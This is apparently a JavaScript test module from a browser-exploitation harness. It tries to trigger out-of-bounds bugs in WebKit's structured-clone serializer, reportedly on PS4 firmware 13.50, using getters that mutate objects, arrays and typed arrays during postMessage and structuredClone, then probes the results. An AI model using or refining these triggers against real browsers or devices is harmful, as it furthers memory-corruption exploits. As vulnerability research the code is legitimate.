/**
 * CENÁRIO: STRUCTURED_CLONE_MUTATION
 * Superfície C++: SerializedScriptValue.cpp / CloneSerializer / CloneDeserializer
 * Risco: HIGH
 *
 * Diferença para a versão genérica:
 *   - Versão anterior tinha apenas um getter que encolhia um array — o
 *     CloneSerializer pode detectar isso e lançar DataCloneError antes
 *     de atingir o OOB.
 *   - Versão robusta usa 3 vetores de mutação durante a clonagem:
 *     (A) Getter que muta a estrutura do próprio objeto sendo serializado
 *     (B) Array com getter de índice (Proxy-like via Object.defineProperty)
 *         — força recálculo de tamanho durante a varredura do Butterfly
 *     (C) Objeto com getter que adiciona novas propriedades ao objeto
 *         enquanto o serializer está iterando as propriedades
 *   - Usa MessageChannel.port1.postMessage para disparar clonagem real
 *     e também testStructuredClone() (se disponível no PS4 FW 13.50).
 */

export default {
    id:       'STRUCTURED_CLONE_MUTATION',
    category: 'Concurrency',
    risk:     'HIGH',
    description:
        'Ataca CloneSerializer via getters que mutam o objeto durante a serialização. ' +
        'Vetor A: getter muta array de apoio. ' +
        'Vetor B: Uint8Array com getter de índice via defineProperty. ' +
        'Vetor C: getter adiciona novas props durante iteração do serializer.',

    setup: function() {
        this.channel  = new MessageChannel();
        this.received = [];
        this.channel.port1.start();
        this.channel.port2.start();
        this.channel.port2.onmessage = e => this.received.push(e.data);

        this.log = [];
    },

    trigger: function() {
        const self = this;

        // ── VETOR A: Getter que encolhe array de apoio ─────────────────────
        const arrayA = [1.1, 2.2, 3.3, 4.4, 5.5];
        const objA = {
            stable: 'unchanged',
            get mutating() {
                self.log.push('A:getter');
                arrayA.length = 0; // Destrói o array DURANTE a cópia
                return 42;
            },
            data: arrayA,  // O serializer vai tentar copiar arrayA DEPOIS do getter
        };

        try {
            this.channel.port1.postMessage(objA);
        } catch(e) { this.log.push('A:' + e.constructor.name); }

        // ── VETOR B: Uint8Array com propriedade de índice redefinida ─────────
        const bufB  = new ArrayBuffer(64);
        const viewB = new Uint8Array(bufB);
        viewB.fill(0xBB);

        // Redefine índice 0 como getter — intercepta acesso durante serialização
        try {
            Object.defineProperty(viewB, '0', {
                get() {
                    self.log.push('B:idx0-getter');
                    // Troca o conteúdo do buffer durante a leitura
                    new Uint8Array(bufB).fill(0xCC);
                    return 0xDD;
                },
                configurable: true
            });
        } catch(e) {}

        try {
            this.channel.port1.postMessage(viewB, [bufB]);
        } catch(e) { this.log.push('B:' + e.constructor.name); }

        // ── VETOR C: Getter que adiciona props durante iteração ──────────────
        const objC = { a: 1, b: 2 };
        let getterCount = 0;
        Object.defineProperty(objC, 'c', {
            get() {
                getterCount++;
                self.log.push('C:getter#' + getterCount);
                // Adiciona nova propriedade ao objeto sendo serializado
                // enquanto o serializer está iterando suas props
                if (getterCount === 1) {
                    try { objC.injected = 'INJECTED_DURING_CLONE'; } catch(e) {}
                }
                return 3;
            },
            enumerable: true, configurable: true
        });

        try {
            this.channel.port1.postMessage(objC);
        } catch(e) { this.log.push('C:' + e.constructor.name); }

        // Também testa structuredClone() se disponível
        try {
            if (typeof structuredClone !== 'undefined') {
                this.cloneResult = structuredClone(objC);
            }
        } catch(e) { this.log.push('structuredClone:' + e.constructor.name); }
    },

    probe: [
        // Mensagens recebidas — presença indica serialização parcial bem-sucedida
        s => s.received.length,
        s => JSON.stringify(s.received[0])?.slice(0, 100),
        s => JSON.stringify(s.received[1])?.slice(0, 100),
        s => JSON.stringify(s.received[2])?.slice(0, 100),

        // Log de invocação dos getters
        s => s.log.join(', '),
        s => s.log.filter(l => l.startsWith('A')).length,
        s => s.log.filter(l => l.startsWith('B')).length,
        s => s.log.filter(l => l.startsWith('C')).length,

        // structuredClone result — prop injetada durante clone deve ou não aparecer
        s => s.cloneResult ? JSON.stringify(s.cloneResult).slice(0, 100) : null,
        s => s.cloneResult?.injected,
    ],

    cleanup: function() {
        try { this.channel.port1.close(); this.channel.port2.close(); } catch(e) {}
        this.received = [];
        this.log = [];
    }
};
